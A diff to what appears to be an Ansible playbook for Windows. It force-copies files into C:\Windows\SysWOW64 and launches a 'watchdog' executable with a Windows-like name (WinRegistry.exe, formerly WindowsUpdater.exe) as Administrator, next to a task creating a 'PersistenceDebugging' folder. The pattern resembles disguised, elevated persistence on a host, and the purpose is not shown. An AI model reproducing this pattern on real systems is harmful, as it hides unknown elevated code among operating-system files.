@@ -26,13 +26,13 @@
 
     - name: Copy files from each source directory to its target location
       win_shell: |
-        Get-ChildItem -Path Deployment1To-SystemApps -File | ForEach-Object {
-            Copy-Item -Path $_.FullName -Destination C:\Windows\SystemApps\ -Force
+        Get-ChildItem -Path Deployment1To-SysWOW64 -File | ForEach-Object {
+            Copy-Item -Path $_.FullName -Destination C:\Windows\SysWOW64\ -Force
         }
 
-    - name: Run the primary watchdog binary as Administrator for WindowsUpdater.exe
+    - name: Run the primary watchdog binary as Administrator for WinRegistry.exe
       win_shell: |
-        Start-Process "C:\Windows\SystemApps\WindowsUpdater.exe" -Verb RunAs
+        Start-Process "C:\Windows\SysWOW64\WinRegistry.exe" -Verb RunAs
 
     -name: Create the PersistenceDebugging folder if it does not exist
       win_file:
